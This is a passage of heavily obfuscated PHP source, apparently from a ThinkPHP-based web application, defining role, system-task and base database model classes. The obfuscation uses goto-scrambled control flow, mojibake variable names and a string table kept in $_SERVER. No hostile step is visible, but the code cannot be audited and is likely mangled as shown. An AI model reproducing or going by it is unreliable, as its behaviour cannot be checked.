$Bò‰îİ„İÑ[$a”Çšµ¿°[28]], $a”Çšµ¿°[2018] => $Bò‰îİ„İÑ[$a”Çšµ¿°[2018]]); } $this->filterAuth($Bò‰îİ„İÑ[$a”Çšµ¿°[372]]); goto BöÉ‚¸ÑÆÃ; eø›¾Æì¾ä: $a”Çšµ¿° =& $_SERVER[‘®…¢À]; $f–ù„ô®âÚ = parent::listData($Dƒ£ÕùÌî÷); $C¨ˆµï‡‘™ = $this->findByName($Bò‰îİ„İÑ[$a”Çšµ¿°[28]]); goto eôÆõ…äè; b˜ª‘—„òÀ: } public function remove($C„›¯‡§ÁÒ) { $B”åÙÚÏÍì = parent::listData($C„›¯‡§ÁÒ); if (!$B”åÙÚÏÍì || $B”åÙÚÏÍì[$_SERVER[‘®…¢À][1037]]) { return !1; } return parent::remove($C„›¯‡§ÁÒ); } public function add($FÜÒÏã¨) { goto CÇà§„¿¸í; CÇà§„¿¸í: $DğØéµÄ¡‰ =& $_SERVER[‘®…¢À]; $d·‘ªøÚŒœ = $FÜÒÏã¨[$DğØéµÄ¡‰[28]]; if ($this->findByName($d·‘ªøÚŒœ)) { return !1; } goto Fã†İË±ğŸ; C¿ó‡©©òœ: return parent::insert($FÜÒÏã¨); goto B±ÜÖÔÄÊ¾; Fã†İË±ğŸ: $D—èğ¸­œ = array($DğØéµÄ¡‰[382] => $d·‘ªøÚŒœ, $DğØéµÄ¡‰[2006] => $DğØéµÄ¡‰[33], $DğØéµÄ¡‰[2002] => $DğØéµÄ¡‰[2019], $DğØéµÄ¡‰[2350] => 1, $DğØéµÄ¡‰[2005] => 0, $DğØéµÄ¡‰[2351] => 0, $DğØéµÄ¡‰[2004] => $this->getSort()); $FÜÒÏã¨ = array_merge($D—èğ¸­œ, $FÜÒÏã¨); $this->filterAuth($FÜÒÏã¨[$DğØéµÄ¡‰[372]]); goto C¿ó‡©©òœ; B±ÜÖÔÄÊ¾: } private function getSort() { $B¬¤óù§Çß =& $_SERVER[‘®…¢À]; $Cá¼ç—‡ = parent::listData(); $bô…¡å†§£ = array_to_keyvalue($Cá¼ç—‡, $B¬¤óù§Çß[33], $B¬¤óù§Çß[2021]); return empty($bô…¡å†§£) ? 0 : max($bô…¡å†§£) + 1; } private function filterAuth(&$FÒÜŞ±ª†À) { $B‘Šè£ˆçš =& $_SERVER[‘®…¢À]; $e•ÕÃáø = array(); $F´ÔÂˆš”Œ = array_filter(explode($B‘Šè£ˆçš[47], $FÒÜŞ±ª†À)); foreach ($F´ÔÂˆš”Œ as $FÒÜŞ±ª†À) { $B×Ã°òà†· = explode($B‘Šè£ˆçš[94], $FÒÜŞ±ª†À); if ($B×Ã°òà†·[0] == $B‘Šè£ˆçš[1680] && $B×Ã°òà†·[1] != $B‘Šè£ˆçš[994]) { $eÖĞÒ¶îØ† = $B×Ã°òà†·[0] . $B‘Šè£ˆçš[94] . $B×Ã°òà†·[1] . $B‘Šè£ˆçš[2352]; if (!in_array($eÖĞÒ¶îØ†, $F´ÔÂˆš”Œ)) { $e•ÕÃáø[] = $eÖĞÒ¶îØ†; } } $e•ÕÃáø[] = $FÒÜŞ±ª†À; } $FÒÜŞ±ª†À = implode($B‘Šè£ˆçš[47], $e•ÕÃáø); } public function sort($cœ‹â‰î‘¬, $EÏÇÁõŠ„É) { return parent::update($cœ‹â‰î‘¬, $EÏÇÁõŠ„É); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\x74\141\163\153\x4c\x69\163\164"; public $field = array("\156\141\x6d\145", "\x74\171\160\x65", "\145\x76\145\x6e\x74", "\x74\x69\155\x65", "\144\145\x73\x63", "\163\171\163\164\145\155", "\x65\156\x61\x62\154\145", "\x6c\x61\163\x74\122\165\156", "\x73\157\x72\164"); public function listData($c–×™¬ñçœ = false, $Döª¬ŸÓ¨ = "\x73\157\x72\x74", $C­ÃÑÂ÷·š = false) { return parent::listData($c–×™¬ñçœ, $Döª¬ŸÓ¨, $C­ÃÑÂ÷·š); } public function add($DÕÂã¼‰ï¤) { $A¯‚¥–Ü°Í =& $_SERVER[‘®…¢À]; $c•§­õæÅë = $this->findByName($DÕÂã¼‰ï¤[$A¯‚¥–Ü°Í[28]]); if ($c•§­õæÅë) { return !1; } $DÕÂã¼‰ï¤[$A¯‚¥–Ü°Í[1303]] = 0; $DÕÂã¼‰ï¤[$A¯‚¥–Ü°Í[2021]] = $this->getSort(); return parent::insert($DÕÂã¼‰ï¤); } private function getSort() { $câ¹Œ×±òŸ =& $_SERVER[‘®…¢À]; $C ´ §¢Š¡ = parent::listData(); $F¼œİ›Âœ = array_to_keyvalue($C ´ §¢Š¡, $câ¹Œ×±òŸ[33], $câ¹Œ×±òŸ[2021]); return empty($F¼œİ›Âœ) ? 0 : max($F¼œİ›Âœ) + 1; } public function update($dİ¡Ú°¬¶æ, $AÂƒÒ÷§Ñ) { $CÖ×ãÌ§Ÿ‹ =& $_SERVER[‘®…¢À]; $E…ëÚŒïµÛ = $this->listData($dİ¡Ú°¬¶æ); $eÉ‘Ÿ÷Ôèª = $this->findByName($AÂƒÒ÷§Ñ[$CÖ×ãÌ§Ÿ‹[28]]); if (!$E…ëÚŒïµÛ || $eÉ‘Ÿ÷Ôèª && $eÉ‘Ÿ÷Ôèª[$CÖ×ãÌ§Ÿ‹[363]] != $E…ëÚŒïµÛ[$CÖ×ãÌ§Ÿ‹[363]]) { return !1; } return parent::update($dİ¡Ú°¬¶æ, $AÂƒÒ÷§Ñ); } public function remove($D­íËìŞÂ) { $Câ½•áñ–ñ = $this->listData($D­íËìŞÂ); if (!$Câ½•áñ–ñ || $Câ½•áñ–ñ[$_SERVER[‘®…¢À][1037]]) { return !1; } return parent::remove($D­íËìŞÂ); } public function enable($cäö‘ìÒƒ) { $C²»§ªÊ¢ =& $_SERVER[‘®…¢À]; $dŠõÄÂÖ¾Ú = $this->listData($cäö‘ìÒƒ); $a‰ì›­™£‘ = !$dŠõÄÂÖ¾Ú[$C²»§ªÊ¢[1310]]; return $this->update($cäö‘ìÒƒ, array($C²»§ªÊ¢[2353] => $a‰ì›­™£‘)); } public function run($c¾ÅÎñ¨÷†) { return $this->update($c¾ÅÎñ¨÷†, array($_SERVER[‘®…¢À][2354] => time())); } } goto d…¸ÚìŸŸ½; a†ØÉšÍ¶Õ: define($_SERVER[‘®…¢À][227], 0); define($_SERVER[‘®…¢À][228], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\x65", "\x6f\162\x64\x65\162", "\141\x6c\x69\x61\163", "\150\x61\x76\x69\156\x67", "\147\x72\x6f\x75\160", "\154\157\143\153", "\144\151\163\x74\x69\x6e\143\x74", "\x61\x75\x74\x6f", "\x66\x69\x6c\164\x65\x72", "\166\x61\154\151\144\x61\164\x65", "\162\x65\x73\165\x6c\164", "\x62\x69\156\x64", "\164\x6f\153\145\156"); public function __construct($b‹¢ÈìÀœ­ = '', $fíëòĞ‡‚” = '', $FâÙ­¿Œï = '') { $eõÌãóË»µ =& $_SERVER[‘®…¢À]; $this->_initialize(); if (!empty($b‹¢ÈìÀœ­)) { if (strpos($b‹¢ÈìÀœ­, $eõÌãóË»µ[94])) { list($this->dbName, $this->name) = explode($eõÌãóË»µ[94], $b‹¢ÈìÀœ­); } else { $this->name = $b‹¢ÈìÀœ­; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($fíëòĞ‡‚”)) { $this->tablePrefix = $eõÌãóË»µ[33]; } elseif ($eõÌãóË»µ[33] != $fíëòĞ‡‚”) { $this->tablePrefix = $fíëòĞ‡‚”; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($eõÌãóË»µ[229]); } $this->db(0, empty($this->connection) ? $FâÙ­¿Œï : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $eĞ·ÇÃ£« =& $_SERVER[‘®…¢À]; if (empty($this->fields)) { if (think_config($eĞ·ÇÃ£«[230])) { $AœßÎ­«Ê“ = $this->dbName ? $this->dbName : think_config($eĞ·ÇÃ£«[231]); $B—„Š²Œ³Ş = think_var_cache($eĞ·ÇÃ£«[232] . strtolower(get_path_this($AœßÎ­«Ê“) . $eĞ·ÇÃ£«[94] . $this->name)); if ($B—„Š²Œ³Ş) { $F­æ°ô¤˜ª = think_config($eĞ·ÇÃ£«[233]); if (empty($F­æ°ô¤˜ª) || $B—„Š²Œ³Ş[$eĞ·ÇÃ£«[234]] == $F­æ°ô¤˜ª) { $this->fields = $B—„Š²Œ³Ş; return; } } } $this->flush(); } } public function flush() { goto DÜ¥š¤¬¼; DÜ¥š¤¬¼: $BÃİíä°’ß =& $_SERVER[‘®…¢À]; $this->db->setModel($this->name); $Fˆ¡ï…¿‘È = $this->db->getFields($this->getTableName()); goto Dèğ£ğã£Ñ; Dèğ£ğã£Ñ: if (!$Fˆ¡ï…¿‘È) { return !1; } $this->fields = array_keys($Fˆ¡ï…¿‘È); $this->fields[$BÃİíä°’ß[235]] = !1; goto fÓº—×•; C’å£Á”í’: if (think_config($BÃİíä°’ß[230])) { $Fİ„˜ø¾ƒ = $this->dbName ? $this->dbName : think_config($BÃİíä°’ß[231]); think_var_cache($BÃİíä°’ß[232] . strtolower(get_path_this($Fİ„˜ø¾ƒ) . $BÃİíä°’ß[94] . $this->name), $this->fields); } goto dÏ›ë³¾Óâ; fÓº—×•: foreach ($Fˆ¡ï…¿‘È as $B‚Ù’îåÊ => $b…‘ÁŒ¡) { $cï¦õÔ¯ØÃ[$B‚Ù’îåÊ] = $b…‘ÁŒ¡[$BÃİíä°’ß[29]]; if ($b…‘ÁŒ¡[$BÃİíä°’ß[36]]) { $this->fields[$BÃİíä°’ß[236]] = $B‚Ù’îåÊ; if ($b…‘ÁŒ¡[$BÃİíä°’ß[39]]) { $this->fields[$BÃİíä°’ß[235]] = !0; } } } $this->fields[$BÃİíä°’ß[237]] = $cï¦õÔ¯ØÃ; if (think_config($BÃİíä°’ß[233])) { $this->fields[$BÃİíä°’ß[234]] = think_config($BÃİíä°’ß[233]); } goto C’å£Á”í’; dÏ›ë³¾Óâ: } public function switchModel($BíÎğ¡ÂÚ”, $C¼¬­×êÆÒ = array()) { $Bõ†¥Î½› =& $_SERVER[‘®…¢À]; $cÎ‘öÒÀŒÚ = ucwords(strtolower($BíÎğ¡ÂÚ”)) . $Bõ†¥Î½›[238]; if (!class_exists($cÎ‘öÒÀŒÚ)) { think_exception($cÎ‘öÒÀŒÚ . think_lang($Bõ†¥Î½›[239])); } $this->_extModel = new $cÎ‘öÒÀŒÚ($this->name); if (!empty($C¼¬­×êÆÒ)) { foreach ($C¼¬­×êÆÒ as $fƒÎ†‰ƒë”) { $this->_extModel->setProperty($fƒÎ†‰ƒë”, $this->{$fƒÎ†‰ƒë”}); } } return $this->_extModel; } public function __set($B¼¾¡òÔÓ», $BÃğÜ‘¹áÇ) { $this->data[$B¼¾¡òÔÓ»] = $BÃğÜ‘¹áÇ; } public function __get($C„ÇÙÕÛÌ) { return isset($this->data[$C„ÇÙÕÛÌ]) ? $this->data[$C„ÇÙÕÛÌ] : null; } public function __isset($d•Æ·ç½¶) { return isset($this->data[$d•Æ·ç½¶]); } public function __unset($b“’ÀØ¹­ö) { unset($this->data[$b“’ÀØ¹­ö]); } public function __call($c¡Œ‚ÑØ“Ò, $bàæ©Ã¨äï) { $Fß§ï¬¯Ÿ‹ =& $_SERVER[‘®…¢À]; if (in_array(strtolower($c¡Œ‚ÑØ“Ò), $this->methods, !0)) { $this->options[strtolower($c¡Œ‚ÑØ“Ò)] = $bàæ©Ã¨äï[0]; return $this; } elseif (in_array(strtolower($c¡Œ‚ÑØ“Ò), array($Fß§ï¬¯Ÿ‹[240], $Fß§ï¬¯Ÿ‹[241], $Fß§ï¬¯Ÿ‹[242], $Fß§ï¬¯Ÿ‹[243], $Fß§ï¬¯Ÿ‹[244]), !0)) { $E«Ñ¾”ëì = isset($bàæ©Ã¨äï[0]) ? $bàæ©Ã¨äï[0] : $Fß§ï¬¯Ÿ‹[173]; $E«Ñ¾”ëì = $this->db->parseKey($E«Ñ¾”ëì); return $this->getField(strtoupper($c¡Œ‚ÑØ“Ò) . $Fß§ï¬¯Ÿ‹[245] . $E«Ñ¾”ëì . $Fß§ï¬¯Ÿ‹[246] . $c¡Œ‚ÑØ“Ò, $Fß§ï¬¯Ÿ‹[240]); } elseif (strtolower(substr($c¡Œ‚ÑØ“Ò, 0, 5)) == $Fß§ï¬¯Ÿ‹[247]) { $E«Ñ¾”ëì = think_parse_name(substr($c¡Œ‚ÑØ“Ò, 5)); $AÈòÄ†ÙßÚ[$E«Ñ¾”ëì] = $bàæ©Ã¨äï[0]; return $this->where($AÈòÄ†ÙßÚ)->find(); } elseif (strtolower(substr($c¡Œ‚ÑØ“Ò, 0, 10)) == $Fß§ï¬¯Ÿ‹[248]) { $bİ¬¶¥’œª = think_parse_name(substr($c¡Œ‚ÑØ“Ò, 10)); $AÈòÄ†ÙßÚ[$bİ¬¶¥’œª] = $bàæ©Ã¨äï[0]; return $this->where($AÈòÄ†ÙßÚ)->getField($bàæ©Ã¨äï[1]); } elseif (isset($this->_scope[$c¡Œ‚ÑØ“Ò])) { return $this->scope($c¡Œ‚ÑØ“Ò, $bàæ©Ã¨äï[0]); } elseif (method_exists($this, $c¡Œ‚ÑØ“Ò)) { array_unshift($bàæ©Ã¨äï, $c¡Œ‚ÑØ“Ò); return call_user_func_array(array($this, $Fß§ï¬¯Ÿ‹[249]), $bàæ©Ã¨äï); } else { return call_user_func_array(array(parent, $c¡Œ‚ÑØ“Ò), $bàæ©Ã¨äï); } } protected function call() { goto dÔš–ÑŒÓ¤; dÔš–ÑŒÓ¤: $e¾–ÓİŒŸ =& $_SERVER[‘®…¢À]; $C•ŠÚ¾šŠ† = func_get_args(); $fâôÛãæ³‹ = array_shift($C•ŠÚ¾šŠ†); goto Døˆ¸Œ—‹ ; Døˆ¸Œ—‹ : $d„Œ³çÄ¢ = $fâôÛãæ³‹; if (is_array($fâôÛãæ³‹)) { $d„Œ³çÄ¢ = $fâôÛãæ³‹[1]; $fâôÛãæ³‹ = $fâôÛãæ³‹[0]; } $CİÕ¯à¨œ = count($C•ŠÚ¾šŠ†) - 1; goto BõÎî¿î§Ï; D½¿È©±: $c’©ğõ¦¾™ = call_user_func_array(array($this, $fâôÛãæ³‹), $C•ŠÚ¾šŠ†); if (method_exists($this, $e¾–ÓİŒŸ[253])) { $eö…¯óİ½Ş = call_user_func_array(array($this, $e¾–ÓİŒŸ[254]), array($d„Œ³çÄ¢, $C•ŠÚ¾šŠ†, $c’©ğõ¦¾™)); if ($eö…¯óİ½Ş) { return $eö…¯óİ½Ş; } } return $c’©ğõ¦¾™; goto D…ÊÍİôŒ; BõÎî¿î§Ï: if (isset($C•ŠÚ¾šŠ†[$CİÕ¯à¨œ]) && $C•ŠÚ¾šŠ†[$CİÕ¯à¨œ] === $fâôÛãæ³‹) { think_exception(__CLASS__ . $e¾–ÓİŒŸ[4] . $fâôÛãæ³‹ . think_lang($e¾–ÓİŒŸ[250])); return; } $C•ŠÚ¾šŠ†[] = $fâôÛãæ³‹; if (method_exists($this, $e¾–ÓİŒŸ[251])) { $eö…¯óİ½Ş = call_user_func_array(array($this, $e¾–ÓİŒŸ[252]), array($d„Œ³çÄ¢, $C•ŠÚ¾šŠ†)); if (!is_null($eö…¯óİ½Ş) && $eö…¯óİ½Ş !== !1) { return $eö…¯óİ½Ş; } } goto D½¿È©±; D…ÊÍİôŒ: } protected function _initialize() { } protected function _facade($dá´˜¹é„) { $EÒõôàÜ =& $_SERVER[‘®…¢À]; if (!empty($this->fields)) { foreach ($dá´˜¹é„ as $DÔ“¯´‡¼ => $AºÏ¤â„Ï”) { if (!in_array($DÔ“¯´‡¼, $this->fields, !0)) { unset($dá´˜¹é„[$DÔ“¯´‡¼]); } elseif (is_scalar($AºÏ¤â„Ï”)) { $this->_parseType($dá´˜¹é„, $DÔ“¯´‡¼); } } } if (!empty($this->options[$EÒõôàÜ[255]])) { $dá´˜¹é„ = array_map($this->options[$EÒõôàÜ[255]], $dá´˜¹é„); unset($this->options[$EÒõôàÜ[255]]); } $this->_beforeWrite($dá´˜¹é„); return $dá´˜¹é„; } protected function _beforeWrite(&$AÃµ†Ä¶£) { } public function add($aº÷¾ôÌõù = '', $eòÄÅãƒœ = array(), $Aæ¦Í¯§Ü÷ = false) { goto AšÔ›ÄÎÍï; F‘¯„Øì¾à: return $eÛÕ³Ëå¾; goto EÀ‚ˆ²è©; fÃÇÛÂ‘´: if (!1 === $this->_beforeInsert($aº÷¾ôÌõù, $eòÄÅãƒœ)) { return !1; } $eÛÕ³Ëå¾ = $this->db->insert($aº÷¾ôÌõù, $eòÄÅãƒœ, $Aæ¦Í¯§Ü÷); if (!1 !== $eÛÕ³Ëå¾) { $F‡ Ğ«Ä“ï = $this->getLastInsID(); if ($F‡ Ğ«Ä“ï) { $aº÷¾ôÌõù[$this->getPk()] = $F‡ Ğ«Ä“ï; $this->_after_insert($aº÷¾ôÌõù, $eòÄÅãƒœ); return $F‡ Ğ«Ä“ï; } $this->_after_insert($aº÷¾ôÌõù, $eòÄÅãƒœ); } goto F‘¯„Øì¾à; AšÔ›ÄÎÍï: if (empty($aº÷¾ôÌõù)) { if (!empty($this->data)) { $aº÷¾ôÌõù = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[‘®…¢À][256]); return !1; } } $eòÄÅãƒœ = $this->_parseOptions($eòÄÅãƒœ); $aº÷¾ôÌõù = $this->_facade($aº÷¾ôÌõù); goto fÃÇÛÂ‘´; EÀ‚ˆ²è©: } protected function _beforeInsert(&$cÃ§§®ÓÎµ, $f†­»¼ùñ) { } protected function _after_insert($D­¯Ò«¼Ğ, $f¸İ¾¢²„Õ) { } public function addAll($fÃæÜùó–¥, $aÔîøïñİš = array(), $dİ—½½–Ÿ = false) { goto E²ÛˆŠö×¨; D¸ãğœŞˆ›: foreach ($fÃæÜùó–¥ as $E¢åô“‚î => $f‚‡†ì‰°) { $fÃæÜùó–¥[$E¢åô“‚î] = $this->_facade($f‚‡†ì‰°); } if (method_exists($this->db, $b¹ÙïŒÃÑ[257])) { $fİŠ­¼°Î = $this->db->insertAll($fÃæÜùó–¥, $aÔîøïñİš, $dİ—½½–Ÿ); } else { $this->startTrans(); foreach ($fÃæÜùó–¥ as $E¢åô“‚î => $f‚‡†ì‰°) { $fİŠ­¼°Î = $this->db->insert($f‚‡†ì‰°, $aÔîøïñİš, $dİ—½½–Ÿ); } $this->commit(); } if (!1 !== $fİŠ­¼°Î) { $d² ‡À“ ‚ = $this->getLastInsID(); if ($d² ‡À“ ‚) { return $d² ‡À“ ‚; } } goto b¸ƒƒ·°ò­; E²ÛˆŠö×¨: $b¹ÙïŒÃÑ =& $_SERVER[‘®…¢À]; if (empty($fÃæÜùó–¥)) { $this->error = think_lang($b¹ÙïŒÃÑ[256]); return !1; } $aÔîøïñİš = $this->_parseOptions($aÔîøïñİš); goto D¸ãğœŞˆ›; b¸ƒƒ·°ò­: return $fİŠ­¼°Î; goto añ”©šÈºô; añ”©šÈºô: } public function selectAdd($EšÑ›Å†ÏÒ = '', $fƒÚÈŒ¡ë = '', $fÂÀî˜ç„ô = array()) { $d¬´­ªºÄ— =& $_SERVER[‘®…¢À]; $fÂÀî˜ç„ô = $this->_parseOptions($fÂÀî˜ç„ô); if (!1 === ($B¾ÎË˜¬¶ë = $this->db->selectInsert($EšÑ›Å†ÏÒ ? $EšÑ›Å†ÏÒ : $fÂÀî˜ç„ô[$d¬´­ªºÄ—[258]], $fƒÚÈŒ¡ë ? $fƒÚÈŒ¡ë : $this->getTableName(), $fÂÀî˜ç„ô))) { $this->error = think_lang($d¬´­ªºÄ—[259]); return !1; } else { return $B¾ÎË˜¬¶ë; } } public function save($bâ»ºÊ‡•» = '', $B‰Â¿­–ñ¨ = array()) { goto eçƒÁÈˆ; dµŸ¼ À¦¨: $B‰Â¿­–ñ¨ = $this->_parseOptions($B‰Â¿­–ñ¨); $b˜†¢ì‘ = $this->getPk(); if (!isset($B‰Â¿­–ñ¨[$C°ß Äö¥Æ[260]])) { if (isset($bâ»ºÊ‡•»[$b˜†¢ì‘])) { $b‚œ‹‰‚Ş±[$b˜†¢ì‘] = $bâ»ºÊ‡•»[$b˜†¢ì‘]; $B‰Â¿­–ñ¨[$C°ß Äö¥Æ[260]] = $b‚œ‹‰‚Ş±; unset($bâ»ºÊ‡•»[$b˜†¢ì‘]); } else { $this->error = think_lang($C°ß Äö¥Æ[259]); return !1; } } goto EåêŒÓ®œ; fò˜Š‘¤‘´: if (!1 !== $EÓ¯µŸØ¢î) { if (isset($eÆ¸îÛ‹‹)) { $bâ»ºÊ‡•»[$b˜†¢ì‘] = $eÆ¸îÛ‹‹; } $this->_afterUpdate($bâ»ºÊ‡•», $B‰Â¿­–ñ¨); } return $EÓ¯µŸØ¢î; goto e°ƒÎÄ‹®; EåêŒÓ®œ: if (is_array($B‰Â¿­–ñ¨[$C°ß Äö¥Æ[260]]) && isset($B‰Â¿­–ñ¨[$C°ß Äö¥Æ[260]][$b˜†¢ì‘])) { $eÆ¸îÛ‹‹ = $B‰Â¿­–ñ¨[$C°ß Äö¥Æ[260]][$b˜†¢ì‘]; } if (!1 === $this->_beforeUpdate($bâ»ºÊ‡•», $B‰Â¿­–ñ¨)) { return !1; } $EÓ¯µŸØ¢î = $this->db->update($bâ»ºÊ‡•», $B‰Â¿­–ñ¨); goto fò˜Š‘¤‘´; eçƒÁÈˆ: $C°ß Äö¥Æ =& $_SERVER[‘®…¢À]; if (empty($bâ»ºÊ‡•»)) { if (!empty($this->data)) { $bâ»ºÊ‡•» = $this->data; $this->data = array(); } else { $this->error = think_lang($C°ß Äö¥Æ[256]); return !1; } } $bâ»ºÊ‡•» = $this->_facade($bâ»ºÊ‡•»); goto dµŸ¼ À¦¨; e°ƒÎÄ‹®: } protected function _beforeUpdate(&$d‘¹¿¤çˆ®, $Aõõ•Ã¶É) { } protected function _afterUpdate($eÏƒ¤†ğĞ, $F´áµˆ ¸ğ) { } public function delete($aÀ¶ÇˆäŒ = array()) { goto Aù³íß›âÊ; c’‘³™§–è: if (is_numeric($aÀ¶ÇˆäŒ) || is_string($aÀ¶ÇˆäŒ)) { if (strpos($aÀ¶ÇˆäŒ, $f£ÚÑµÖö‚[47])) { $f‡Ç‹Ã†¹ª[$Eèê»ÍÁ¸] = array($f£ÚÑµÖö‚[261], $aÀ¶ÇˆäŒ); } else { $f‡Ç‹Ã†¹ª[$Eèê»ÍÁ¸] = $aÀ¶ÇˆäŒ; } $this->options[$f£ÚÑµÖö‚[260]] = $f‡Ç‹Ã†¹ª; } $aÀ¶ÇˆäŒ = $this->_parseOptions(); if (is_array($aÀ¶ÇˆäŒ[$f£ÚÑµÖö‚[260]]) && isset($aÀ¶ÇˆäŒ[$f£ÚÑµÖö‚[260]][$Eèê»ÍÁ¸])) { $d«šÆÌïáØ = $aÀ¶ÇˆäŒ[$f£ÚÑµÖö‚[260]][$Eèê»ÍÁ¸]; } goto eßš¦ùè¸; Aù³íß›âÊ: $f£ÚÑµÖö‚ =& $_SERVER[‘®…¢À]; if (empty($aÀ¶ÇˆäŒ) && empty($this->options[$f£ÚÑµÖö‚[260]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Eèê»ÍÁ¸ = $this->getPk(); goto c’‘³™§–è; eßš¦ùè¸: $B‡‘áœŠá = $this->db->delete($aÀ¶ÇˆäŒ); if (!1 !== $B‡‘áœŠá) { $f÷°¤‹£ = array(); if (isset($d«šÆÌïáØ)) { $f÷°¤‹£[$Eèê»ÍÁ¸] = $d«šÆÌïáØ; } $this->_after_delete($f÷°¤‹£, $aÀ¶ÇˆäŒ); } return $B‡‘áœŠá; goto B¢°¯ Å¿¿; B¢°¯ Å¿¿: } protected function _after_delete($C‡š‹‹ÙÊÛ, $CÓ“°ÎØâÈ) { } public function select($B¹ßÒ§âø± = array()) { goto aƒ‚¦Ë‚ˆ²; aƒ‚¦Ë‚ˆ²: $bò«õ©ê­ =& $_SERVER[‘®…¢À]; if (is_string($B¹ßÒ§âø±) || is_numeric($B¹ßÒ§âø±)) { $Cİ¡¡…ã³Ö = $this->getPk(); if (strpos($B¹ßÒ§âø±, $bò«õ©ê­[47])) { $aÇÌŞåá[$Cİ¡¡…ã³Ö] = array($bò«õ©ê­[261], $B¹ßÒ§âø±); } else { $aÇÌŞåá[$Cİ¡¡…ã³Ö] = $B¹ßÒ§âø±; } $this->options[$bò«õ©ê­[260]] = $aÇÌŞåá; } elseif (!1 === $B¹ßÒ§âø±) { $B¹ßÒ§âø± = $this->_parseOptions(); return $bò«õ©ê­[262] . $this->db->buildSelectSql($B¹ßÒ§âø±) . $bò«õ©ê­[263]; } $B¹ßÒ§âø± = $this->_parseOptions(); goto B¾Ö¡ƒ…õô; BÂÑàÇ¢é: $this->_afterSelect($b’êõ‘²Š, $B¹ßÒ§âø±); return $b’êõ‘²Š; goto a»ìßÑÒœİ; B¾Ö¡ƒ…õô: $b’êõ‘²Š = $this->db->select($B¹ßÒ§âø±); if (!1 === $b’êõ‘²Š) { return !1; } if (empty($b’êõ‘²Š)) { return null; } goto BÂÑàÇ¢é; a»ìßÑÒœİ: } protected function _afterSelect(&$dºóöğËØº, $E‚Ö ½œÖ£) { } public function buildSql($fíÖåÛ÷É = array()) { $d«é¿‰ö =& $_SERVER[‘®…¢À]; $fíÖåÛ÷É = $this->_parseOptions($fíÖåÛ÷É); return $d«é¿‰ö[262] . $this->db->buildSelectSql($fíÖåÛ÷É) . $d«é¿‰ö[263]; } public function optionsValue($B¶ Æ˜‰Ÿ› = null) { if (is_null($B¶ Æ˜‰Ÿ›)) { return $this->options; } elseif (is_array($B¶ Æ˜‰Ÿ›)) { $this->options = array_merge($this->options, $B¶ Æ˜‰Ÿ›); } } protected function _parseOptions($DâÕ¤Ì‹ = array()) { goto eğ‰óïÏç; d±¹ÛÕŠí¶: if (isset($DâÕ¤Ì‹[$AÓ”¿ÔŠË[260]]) && is_array($DâÕ¤Ì‹[$AÓ”¿ÔŠË[260]]) && !empty($eŠ÷©¿‚‰«) && !isset($DâÕ¤Ì‹[$AÓ”¿ÔŠË[267]]) && !isset($DâÕ¤Ì‹[$AÓ”¿ÔŠË[264]])) { foreach ($DâÕ¤Ì‹[$AÓ”¿ÔŠË[260]] as $Cêäƒ§‹öÕ => $eÈÍÚ³ßÏÖ) { $Cêäƒ§‹öÕ = trim($Cêäƒ§‹öÕ); if (in_array($Cêäƒ§‹öÕ, $eŠ÷©¿‚‰«, !0)) { if (is_scalar($eÈÍÚ³ßÏÖ)) { $this->_parseType($DâÕ¤Ì‹[$AÓ”¿ÔŠË[260]], $Cêäƒ§‹öÕ); } } elseif (!is_numeric($Cêäƒ§‹öÕ) && $AÓ”¿ÔŠË[71] != substr($Cêäƒ§‹öÕ, 0, 1) && !1 === strpos($Cêäƒ§‹öÕ, $AÓ”¿ÔŠË[94]) && !1 === strpos($Cêäƒ§‹öÕ, $AÓ”¿ÔŠË[245]) && !1 === strpos($Cêäƒ§‹öÕ, $AÓ”¿ÔŠË[268]) && !1 === strpos($Cêäƒ§‹öÕ, $AÓ”¿ÔŠË[269])) { unset($DâÕ¤Ì‹[$AÓ”¿ÔŠË[260]][$Cêäƒ§‹öÕ]); } } } $this->_options_filter($DâÕ¤Ì‹); return $DâÕ¤Ì‹; goto cÈÙ‡öÌ; eğ‰óïÏç: $AÓ”¿ÔŠË =& $_SERVER[‘®…¢À]; if (is_array($DâÕ¤Ì‹)) { $DâÕ¤Ì‹ = array_merge($this->options, $DâÕ¤Ì‹); } $this->options = array(); goto C£ÒÁò¡ğ°; C£ÒÁò¡ğ°: if (!isset($DâÕ¤Ì‹[$AÓ”¿ÔŠË[264]])) { $DâÕ¤Ì‹[$AÓ”¿ÔŠË[264]] = $this->getTableName(); $eŠ÷©¿‚‰« = $this->fields; } else { $eŠ÷©¿‚‰« = $this->getDbFields(); } if (!empty($DâÕ¤Ì‹[$AÓ”¿ÔŠË[265]])) { $DâÕ¤Ì‹[$AÓ”¿ÔŠË[264]] .= $AÓ”¿ÔŠË[50] . $DâÕ¤Ì‹[$AÓ”¿ÔŠË[265]]; } $DâÕ¤Ì‹[$AÓ”¿ÔŠË[266]] = $this->name; goto d±¹ÛÕŠí¶; cÈÙ‡öÌ: } protected function _options_filter(&$C™ê£Şœ¥) { } protected function _parseType(&$c¨¢”½ä, $EÂçÉ£¤±) { $Féñ‡‹ÈÛÆ =& $_SERVER[‘®…¢À]; if (empty($this->options[$Féñ‡‹ÈÛÆ[270]][$Féñ‡‹ÈÛÆ[4] . $EÂçÉ£¤±])) { $FÎ„ŒŒ„‚  = strtolower($this->fields[$Féñ‡‹ÈÛÆ[237]][$EÂçÉ£¤±]); if (!1 !== strpos($FÎ„ŒŒ„‚ , $Féñ‡‹ÈÛÆ[271])) { } elseif (!1 === strpos($FÎ„ŒŒ„‚ , $Féñ‡‹ÈÛÆ[272]) && !1 !== strpos($FÎ„ŒŒ„‚ , $Féñ‡‹ÈÛÆ[273])) { $c¨¢”½ä[$EÂçÉ£¤±] = intval($c¨¢”½ä[$EÂçÉ£¤±]); } elseif (!1 !== 